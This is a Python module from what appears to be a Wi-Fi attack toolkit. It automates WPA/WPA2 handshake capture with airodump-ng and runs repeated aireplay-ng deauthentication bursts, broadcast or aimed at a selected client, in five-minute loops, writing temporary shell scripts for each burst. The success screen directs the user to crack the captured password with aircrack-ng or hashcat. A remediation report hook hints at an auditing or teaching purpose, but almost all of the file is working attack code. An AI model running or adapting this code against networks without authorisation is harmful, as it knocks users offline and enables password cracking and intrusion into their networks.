# attacks/handshake.py - COMPLETE VERSION WITH ALL UPDATES

"""
Complete handshake capture with:
- Auto-repeat deauth (5 min unlimited cycles, external terminal)
- Manual deauth (5 min unlimited cycles, client selection with live data, external terminal)
- Passive listening mode (5 min)
- Active handshake validation every 1 second
- 5 second reconnect wait time
- Clean UI with no duplicate lists
- Auto-select if only 1 client
"""

import os
import re
import subprocess
import time
import glob
import sys
from typing import Optional, List, Dict, Any, Tuple
from termcolor import colored

import config
from utils.helpers import run_in_new_terminal
from utils.scan_networks import WiFiScanner

class HandshakeCapture:
    """Manages WPA/WPA2 handshake capture with intelligent deauth cycling."""

    def __init__(self, bssid: str, ssid: str, channel: str, monitor_interface: str, target_info: Dict[str, Any] = None):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = str(channel)
        self.monitor_interface = monitor_interface
        self.scanner = WiFiScanner()
        self.target_info = target_info or {}
        
        # safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('_','-')).rstrip() or "HiddenSSID"
        # safe_bssid = bssid.replace(":", "-")
        # filename_base = f"{safe_ssid}_{safe_bssid}_{int(time.time())}"
        from datetime import datetime

        safe_ssid: str = "".join(c for c in ssid if c.isalnum() or c in ('_','-')).rstrip() or "HiddenSSID"
        safe_bssid = bssid.replace(":", "-")

        date_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        filename_base = f"{safe_ssid}_{safe_bssid}_{int(time.time())}_{date_time}"
        self.output_path_prefix = str(config.HANDSHAKES_DIR / filename_base)
        self.cap_file = f"{self.output_path_prefix}-01.cap"
        
        self.deauth_proc = None

    def run_capture(self):
        """Main handshake capture orchestration."""
        # Check WPA3
        if self._is_wpa3_network():
            self._show_wpa3_warning()
            return

        # Display target info
        self._display_capture_header()

        airodump_proc = None
        handshake_found = False
        user_cancelled = False

        try:
            # Lock channel
            print(colored(f"\n[*] Locking {self.monitor_interface} to channel {self.channel}...", "cyan"))
            subprocess.run(["iwconfig", self.monitor_interface, "channel", self.channel], 
                         check=True, capture_output=True, timeout=10)
            print(colored("[✓] Channel locked.", "green"))

            # Start airodump
            print(colored(f"[*] Starting capture for {self.ssid} ({self.bssid})", "yellow"))
            airodump_cmd = ["airodump-ng", "--bssid", self.bssid, "--channel", self.channel, 
                          "-w", self.output_path_prefix, self.monitor_interface]
            
            # Create new process group to keep airodump running
            airodump_proc = subprocess.Popen(
                airodump_cmd,
                stdin=subprocess.DEVNULL, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp
            )

            # Countdown with color and animation
            for i in range(5, 0, -1):
                dots = "." * ((5 - i) % 4)
                print(colored(f"\r⏳ Waiting for airodump-ng to stabilize ({i}s){dots}   ", "yellow", attrs=['bold']), end='', flush=True)
                time.sleep(1)
            print(colored("\r✓ Airodump-ng stabilized! Ready to capture.           ", "green", attrs=['bold']))

            # Ensure process is still running
            if airodump_proc.poll() is not None:
                print(colored("[!] Airodump-ng stopped unexpectedly. Check interface.", "red"))
                return

            # Prompt for deauth method
            handshake_found = self._prompt_deauth_option()

        except KeyboardInterrupt:
            print(colored("\n[!] Capture stopped by user.", "yellow"))
            user_cancelled = True

        except subprocess.CalledProcessError:
            print(colored("\n[!] Failed to set channel.", "red"))
            user_cancelled = True

        finally:
            print("\n[*] Terminating all processes...")
            
            # Kill entire process group
            if airodump_proc:
                try:
                    os.killpg(os.getpgid(airodump_proc.pid), 9)
                except:
                    airodump_proc.terminate()
                    try:
                        airodump_proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        airodump_proc.kill()
            
            subprocess.run("pkill -9 airodump-ng > /dev/null 2>&1", shell=True)
            subprocess.run("pkill -9 aireplay-ng > /dev/null 2>&1", shell=True)

            # Display results
            if user_cancelled:
                print(colored("\n[FAILURE] Operation cancelled. No handshake saved.", "red"))
                self._cleanup_failed_capture()
            elif handshake_found:
                self._display_success()
            else:
                print(colored("\n[FAILURE] No valid handshake captured.", "red"))
                self._cleanup_failed_capture()

    def _display_capture_header(self):
        """Display capture information header."""
        os.system('clear')
        print(colored("\n╔" + "═" * 60 + "╗", "cyan", attrs=['bold']))
        print(colored("║" + " " * 14 + " 🎯 WPA/WPA2 HANDSHAKE CAPTURE  " + " " * 14 + "║", "cyan", attrs=['bold']))
        print(colored("╚" + "═" * 60 + "╝", "cyan", attrs=['bold']))

        print(colored(f"\n📍 Target Network:", "yellow", attrs=['bold']))
        print(f"   SSID    : {colored(self.ssid, 'white', attrs=['bold'])}")
        print(f"   BSSID   : {self.bssid}")
        print(f"   Channel : {self.channel}")
        
        # Security info
        if self.target_info.get('enc'):
            enc = self.target_info['enc']
            if 'WPA2' in enc:
                sec_display = colored("WPA2", "yellow")
            elif 'WPA' in enc:
                sec_display = colored("WPA", "yellow")
            else:
                sec_display = enc
            print(f"   Security: {sec_display}")

    def _display_success(self):
        """Display success message."""
        print(colored("\n╔" + "═" * 60 + "╗", "green", attrs=['bold']))
        print(colored("║" + "  ✓✓✓ HANDSHAKE CAPTURED SUCCESSFULLY ✓✓✓  ".center(60) + "║", "green", attrs=['bold']))
        print(colored("╚" + "═" * 60 + "╝", "green", attrs=['bold']))
        print(colored(f"\n📁 Saved to: {self.cap_file}", "white", attrs=['bold']))
        print(colored("\n💡 Next step: Use aircrack-ng or hashcat to crack the password", "cyan"))
        
        
        from solution.remediation import RemediationAdvisor


        advisor = RemediationAdvisor()
        


        print(colored("Loading report and fixing steps ", "yellow"), end="")

        spinner = ["|", "/", "-", "\\"]

        for i in range(12):  # animation cycles
            sys.stdout.write("\r" + colored("Loading report and fixing steps " + spinner[i % 4], "yellow"))
            sys.stdout.flush()
            time.sleep(0.25)
        
        # time.sleep(5)
        os.system("clear") 
        print("\r" + colored("Report loaded successfully ✓", "green"))

        
        advisor.show(
            attack_type="handshake",
            target_ssid="Atul",
            target_bssid="26:DC:30:29:AE:75",
            extra_info={
                "Handshake File": "captures/Atul_handshake.cap",
                "Capture Tool": "airodump-ng",
                "Captured At": "channel 10"
            }
)
    #     """Check if network is WPA3."""
    #     if self.target_info.get('is_wpa3', False):
    #         return True
    #     if 'SAE' in self.target_info.get('auth', ''):
    #         return True
    #     return False

    def _is_wpa3_network(self) -> bool:
        """Check whether the network uses WPA3."""

        encryption = str(self.target_info.get('enc', '')).upper()

        if 'WPA3' in encryption:
            return True

        return False

    def _show_wpa3_warning(self):
        """Show WPA3 incompatibility warning."""
        print(colored("\n╔" + "═" * 60 + "╗", "red", attrs=['bold']))
        print(colored("║" + "  ⚠️  WPA3 NETWORK DETECTED  ⚠️  ".center(60) + "  ║", "red", attrs=['bold']))
        print(colored("╚" + "═" * 60 + "╝", "red", attrs=['bold']))
        print(colored("\n[!] Handshake capture not supported for WPA3 (SAE).", "red", attrs=['bold']))
        print(colored("    WPA3 does not use the traditional 4-way handshake.", "yellow"))

    def _cleanup_failed_capture(self):
        """Remove all capture files."""
        for f in glob.glob(f"{self.output_path_prefix}*"):
            try: 
                os.remove(f)
            except OSError: 
                pass

    def _prompt_deauth_option(self) -> bool:
        """Prompt user for capture method - CLEAN VERSION."""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(colored("\n╔" + "═" * 60 + "╗", "yellow"))
        print(colored("║" + " " * 16 + "📋 SELECT CAPTURE METHOD" + " " * 20 + "║", "yellow"))
        print(colored("╚" + "═" * 60 + "╝", "yellow"))

        print(colored("\n  [1]", "green", attrs=['bold']) + " Auto-Repeat Deauth (Recommended)")
        print(colored("      5 min continuous | Unlimited cycles | External terminal", "white"))
        print()
        print(colored("  [2]", "yellow", attrs=['bold']) + " Manual Deauth (Directed to Client)")
        print(colored("      5 min continuous | Client selection | External terminal", "white"))
        print()
        print(colored("  [3]", "white") + " Passive Listening (Stealth)")
        print(colored("      5 min continuous | No attack", "white"))
        
        print()
        choice = input(colored("➤ Select [1-3, default: 1]: ", "cyan", attrs=['bold'])).strip()

        if choice == '2': 
            return self._manual_deauth_submenu()
        elif choice == '3': 
            print(colored("\n[*] Passive listening mode activated.", "cyan"))
            return self._wait_for_passive_handshake()
        else: 
            print(colored("\n[*] Auto-repeat deauth enabled", "green", attrs=['bold']))
            print(colored("[*] Duration: 5 minutes (unlimited cycles)", "yellow"))
            return self._wait_for_handshake_with_deauth()

    def _manual_deauth_submenu(self) -> bool:
        """Manual deauth - client selection only."""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(colored("\n╔" + "═" * 60 + "╗", "yellow"))
        print(colored("║" + " " * 10 + "  ⚙️  MANUAL DEAUTH - CLIENT SELECTION  " + " " * 11 + "║", "yellow"))
        print(colored("╚" + "═" * 60 + "╝", "yellow"))

        print(colored("\n[*] Scanning for connected clients...\n", "cyan"))
        
        # Scan and select client
        client_mac = self._find_and_select_client()
        
        if not client_mac:
            print(colored("\n[!] No client selected. Returning to menu.", "yellow"))
            input("Press Enter to continue...")
            return self._prompt_deauth_option()
        
        # Display selected client
        print(colored(f"\n[✓] Selected Client: {client_mac}", "green", attrs=['bold']))
        print(colored("[*] Duration: 5 minutes (unlimited cycles)", "cyan"))
        print(colored("[*] Mode: Directed deauth attack", "cyan"))
        print(colored("[*] Active handshake monitoring enabled\n", "cyan"))
        
        return self._wait_for_handshake_with_manual_deauth(client_mac)

    def _wait_for_handshake_with_deauth(self) -> bool:
        """Auto-repeat deauth cycle (5 min unlimited cycles)."""
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        start_time = time.time()
        timeout = 300  # 5 minutes
        
        deauth_active = False
        last_deauth_time = 0
        deauth_cycle = 0
        
        print(colored("[*] Active handshake monitoring started...", "cyan", attrs=['bold']))
        print(colored("[*] Auto-deauth cycle: 10s attack → 5s reconnect wait\n", "cyan"))
        
        while True:
            elapsed = int(time.time() - start_time)
            
            is_complete, status_text = self._validate_handshake()
            
            if is_complete:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[🎯 SUCCESS] WPA Handshake captured!", "green", attrs=['bold']))
                print(colored(f"[*] Captured after {elapsed}s in {deauth_cycle} cycle(s)", "green"))
                return True
            
            if elapsed >= timeout:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[!] Timeout reached (5 minutes). No handshake captured.", "red"))
                print(colored(f"    Ran {deauth_cycle} cycle(s). Try different AP or network conditions.", "yellow"))
                return False
            
            current_time = time.time()
            time_since_deauth = current_time - last_deauth_time
            
            # Start deauth every 15 seconds (10s attack + 5s wait)
            if not deauth_active and time_since_deauth >= 15:
                deauth_cycle += 1
                print(colored(f"\n[*] Cycle #{deauth_cycle}: Starting 10s deauth attack...", "yellow", attrs=['bold']))
                self._start_deauth_attack()
                deauth_active = True
                last_deauth_time = current_time
            
            # Stop deauth after 10 seconds
            elif deauth_active and time_since_deauth >= 10:
                print(colored(f"[*] Stopping deauth. Waiting 5s for client reconnection...", "cyan"))
                self._stop_deauth_attack()
                deauth_active = False
            
            # Display status
            file_size_kb = os.path.getsize(self.cap_file) / 1024 if os.path.exists(self.cap_file) else 0
            
            if deauth_active:
                cycle_time = int(time_since_deauth)
                status = f"Deauth active ({cycle_time}/10s)"
                color = "yellow"
            elif time_since_deauth < 15:
                wait_time = int(15 - time_since_deauth)
                status = f"Waiting for reconnect ({wait_time}s)"
                color = "cyan"
            else:
                status = "Preparing next cycle"
                color = "white"
            
            progress = status_text if status_text else f"{file_size_kb:.1f} KB"
            remaining = timeout - elapsed
            status_line = f"[{spinner[elapsed % len(spinner)]}] {status} | Handshake: {progress} | Cycle: {deauth_cycle} | Time: {elapsed}s / 5m"
            
            sys.stdout.write(colored(status_line, color) + "\r")
            sys.stdout.flush()
            time.sleep(1)

    def _wait_for_handshake_with_manual_deauth(self, client_mac: Optional[str] = None) -> bool:
        """Manual deauth with 5 min unlimited cycles."""
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        start_time = time.time()
        timeout = 300  # 5 minutes
        
        deauth_active = False
        last_deauth_time = 0
        deauth_cycle = 0
        
        print(colored("[*] Active handshake monitoring started...", "cyan", attrs=['bold']))
        print(colored("[*] Manual deauth cycle: 10s attack → 5s reconnect wait\n", "cyan"))
        
        while True:
            elapsed = int(time.time() - start_time)
            
            is_complete, status_text = self._validate_handshake()
            
            if is_complete:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[🎯 SUCCESS] WPA Handshake captured!", "green", attrs=['bold']))
                print(colored(f"[*] Captured after {elapsed}s in {deauth_cycle} cycle(s)", "green"))
                return True
            
            if elapsed >= timeout:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[!] Manual mode timeout (5 minutes). No handshake captured.", "red"))
                print(colored(f"    Ran {deauth_cycle} cycle(s). Try Auto-Repeat mode or different client.", "yellow"))
                return False
            
            current_time = time.time()
            time_since_deauth = current_time - last_deauth_time
            
            # Start deauth every 15 seconds (10s attack + 5s wait)
            if not deauth_active and time_since_deauth >= 15:
                deauth_cycle += 1
                print(colored(f"\n[*] Cycle #{deauth_cycle}: Starting 10s deauth attack...", "yellow", attrs=['bold']))
                self._start_manual_deauth_attack(client_mac)
                deauth_active = True
                last_deauth_time = current_time
            
            # Stop deauth after 10 seconds
            elif deauth_active and time_since_deauth >= 10:
                print(colored(f"[*] Stopping deauth. Waiting 5s for client reconnection...", "cyan"))
                self._stop_deauth_attack()
                deauth_active = False
            
            # Display status
            file_size_kb = os.path.getsize(self.cap_file) / 1024 if os.path.exists(self.cap_file) else 0
            
            if deauth_active:
                cycle_time = int(time_since_deauth)
                status = f"Deauth active ({cycle_time}/10s)"
                color = "yellow"
            elif time_since_deauth < 15:
                wait_time = int(15 - time_since_deauth)
                status = f"Waiting for reconnect ({wait_time}s)"
                color = "cyan"
            else:
                status = "Preparing next cycle"
                color = "white"
            
            progress = status_text if status_text else f"{file_size_kb:.1f} KB"
            status_line = f"[{spinner[elapsed % len(spinner)]}] {status} | Handshake: {progress} | Cycle: {deauth_cycle} | Time: {elapsed}s / 5m"
            
            sys.stdout.write(colored(status_line, color) + "\r")
            sys.stdout.flush()
            time.sleep(1)

    def _wait_for_passive_handshake(self) -> bool:
        """Passive listening mode - no deauth attack (5 min)."""
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        start_time = time.time()
        timeout = 300  # 5 minutes
        
        print(colored("\n[*] Passive listening mode - waiting for natural handshake...", "cyan", attrs=['bold']))
        print(colored("[*] No deauth attacks will be sent (stealth mode)", "cyan"))
        print(colored("[*] Duration: 5 minutes\n", "yellow"))
        
        while True:
            elapsed = int(time.time() - start_time)
            
            is_complete, status_text = self._validate_handshake()
            
            if is_complete:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[🎯 SUCCESS] Natural handshake captured!", "green", attrs=['bold']))
                print(colored(f"[*] Captured after {elapsed}s of passive listening", "green"))
                return True
            
            if elapsed >= timeout:
                sys.stdout.write("\r\x1b[2K")
                print(colored("\n[!] Passive listening timeout (5 minutes). No handshake captured.", "red"))
                print(colored("    Tip: Use Auto-Repeat mode for faster results.", "cyan"))
                return False
            
            file_size_kb = os.path.getsize(self.cap_file) / 1024 if os.path.exists(self.cap_file) else 0
            progress = status_text if status_text else f"{file_size_kb:.1f} KB"
            
            status_line = f"[{spinner[elapsed % len(spinner)]}] Passive listening | Handshake: {progress} | Time: {elapsed}s / 5m"
            
            sys.stdout.write(colored(status_line, "cyan") + "\r")
            sys.stdout.flush()
            time.sleep(1)

    def _validate_handshake(self) -> Tuple[bool, Optional[str]]:
        """Check if handshake is complete."""
        if not os.path.exists(self.cap_file): 
            return False, "No data yet"

        try:
            cmd = ["aircrack-ng", self.cap_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = result.stdout + result.stderr

            if "1 handshake" in output: 
                return True, "Complete ✓"

            match = re.search(r'\(WPA handshake: (\d/4)\)', output)
            if match: 
                return False, f"{match.group(1)}"

            return False, "0/4"
        except: 
            return False, "Checking..."

    def _find_and_select_client(self) -> Optional[str]:
        """Scan for clients and let user select - with auto-select if only 1."""
        clients = self.scanner.scan_for_clients(self.monitor_interface, self.bssid, int(self.channel))
        if not clients:
            print(colored("\n[!] No clients found. Using broadcast deauth.", "yellow"))
            return None
        
        # Auto-select if only 1 client
        if len(clients) == 1:
            client_mac = clients[0]['Station MAC']
            print(colored(f"[✓] Auto-selected: {client_mac}", "green", attrs=['bold']))
            return client_mac
        
        # Show list for multiple clients
        return self._select_client_from_scan(clients)

    def _select_client_from_scan(self, clients: List[Dict[str, Any]]) -> Optional[str]:
        """Direct client selection - display live data."""
        print(colored("━" * 70, "cyan"))
        print(colored(f"[*] Connected clients ({len(clients)}):\n", "cyan"))
        
        for i, client in enumerate(clients, 1):
            mac = client['Station MAC']
            power = client.get('Power', 'N/A')
            print(colored(f"  [{i}]", "yellow") + f" {mac}  |  Power: {power} dBm")
        
        print()
        print(colored("━" * 70, "cyan"))

        try:
            choice = input(colored("\n  ➤ Client NUM (or Enter to cancel): ", "cyan", attrs=['bold'])).strip()
            if choice and 1 <= int(choice) <= len(clients):
                client_mac = clients[int(choice) - 1]['Station MAC']
                print(colored(f"\n[✓] Selected: {client_mac}", "green", attrs=['bold']))
                return client_mac
            else:
                print(colored("\n[*] Cancelled.", "yellow"))
                return None
        except (ValueError, IndexError):
            print(colored("\n[!] Invalid input.", "red"))
            return None

    def _start_deauth_attack(self):
        """Start broadcast deauth attack in external terminal."""
        deauth_script = f"/tmp/deauth_broadcast_{int(time.time())}.sh"
        
        with open(deauth_script, 'w') as f:
            f.write(f"""#!/bin/bash
echo "╔════════════════════════════════════════════════════════════╗"
echo "║        ⚡ DEAUTHENTICATION ATTACK - BROADCAST MODE        ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "[*] Target AP: {self.bssid}"
echo "[*] SSID: {self.ssid}"
echo "[*] Channel: {self.channel}"
echo "[*] Mode: Broadcast (all clients)"
echo ""
echo "[*] Sending high-frequency deauth packets for 10 seconds..."
echo ""
echo "════════════════════════════════════════════════════════════"
echo ""

timeout 10 aireplay-ng --deauth 0 -a {self.bssid} {self.monitor_interface}

echo ""
echo "[✓] 10 second attack completed"
echo "[*] Window closing in 2 seconds..."
sleep 2
exit 0
""")
        
        os.chmod(deauth_script, 0o755)
        
        terminals = [
            ("qterminal", f"qterminal -e bash {deauth_script}"),
            ("gnome-terminal", f"gnome-terminal -- bash {deauth_script}"),
            ("xterm", f"xterm -e bash {deauth_script}"),
            ("konsole", f"konsole -e bash {deauth_script}"),
            ("xfce4-terminal", f"xfce4-terminal -e bash {deauth_script}"),
        ]
        
        self.deauth_proc = None
        for term_name, terminal_cmd in terminals:
            try:
                self.deauth_proc = subprocess.Popen(terminal_cmd, shell=True, 
                                                   stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL)
                print(colored(f"[✓] Broadcast deauth attack in {term_name}", "green"))
                time.sleep(0.5)
                break
            except:
                continue
        
        if not self.deauth_proc:
            print(colored(f"[!] No terminal, running in background", "yellow"))
            deauth_cmd = f"timeout 10 aireplay-ng --deauth 0 -a {self.bssid} {self.monitor_interface}"
            self.deauth_proc = subprocess.Popen(deauth_cmd, shell=True,
                                              stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)

    
    def _start_manual_deauth_attack(self, client_mac: Optional[str] = None):
        """Start manual deauth in external terminal."""
        deauth_script = f"/tmp/deauth_directed_{int(time.time())}.sh"
        
        with open(deauth_script, 'w') as f:
            f.write(f"""#!/bin/bash
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║        ⚡ DEAUTHENTICATION ATTACK - DIRECTED MODE         ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo ""
    echo "[*] Target AP: {self.bssid}"
    echo "[*] SSID: {self.ssid}"
    echo "[*] Channel: {self.channel}"
    echo "[*] Target Client: {client_mac if client_mac else 'Broadcast'}"
    echo ""
    echo "[*] Sending directed deauth packets for 10 seconds..."
    echo ""
    echo "════════════════════════════════════════════════════════════"
    echo ""

    timeout 10 aireplay-ng --deauth 0 -a {self.bssid}{' -c ' + client_mac if client_mac else ''} {self.monitor_interface}

    echo ""
    echo "[✓] 10 second attack completed"
    echo "[*] Window closing in 2 seconds..."
    sleep 2
    exit 0
    """)
        
        os.chmod(deauth_script, 0o755)
        
        terminals = [
            ("qterminal", f"qterminal -e bash {deauth_script}"),
            ("gnome-terminal", f"gnome-terminal -- bash {deauth_script}"),
            ("xterm", f"xterm -e bash {deauth_script}"),
            ("konsole", f"konsole -e bash {deauth_script}"),
            ("xfce4-terminal", f"xfce4-terminal -e bash {deauth_script}"),
        ]
        
        self.deauth_proc = None
        for term_name, terminal_cmd in terminals:
            try:
                self.deauth_proc = subprocess.Popen(terminal_cmd, shell=True,
                                                stdout=subprocess.DEVNULL,
                                                stderr=subprocess.DEVNULL)
                print(colored(f"[✓] Directed deauth attack in {term_name}", "green"))
                if client_mac:
                    print(colored(f"    Client: {client_mac}", "yellow"))
                time.sleep(0.5)
                break
            except:
                continue
        
        if not self.deauth_proc:
            print(colored(f"[!] No terminal, running in background", "yellow"))
            deauth_cmd = f"timeout 10 aireplay-ng --deauth 0 -a {self.bssid}"
            if client_mac:
                deauth_cmd += f" -c {client_mac}"
            deauth_cmd += f" {self.monitor_interface}"
            
            self.deauth_proc = subprocess.Popen(deauth_cmd, shell=True,
                                            stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL)


    def _stop_deauth_attack(self):
        """Stop all deauth processes and cleanup."""
        if self.deauth_proc:
            try:
                self.deauth_proc.terminate()
                self.deauth_proc.wait(timeout=1)
            except:
                pass
            self.deauth_proc = None
        subprocess.run("pkill -9 aireplay-ng > /dev/null 2>&1", shell=True)
        subprocess.run("rm -f /tmp/deauth_*.sh > /dev/null 2>&1", shell=True)
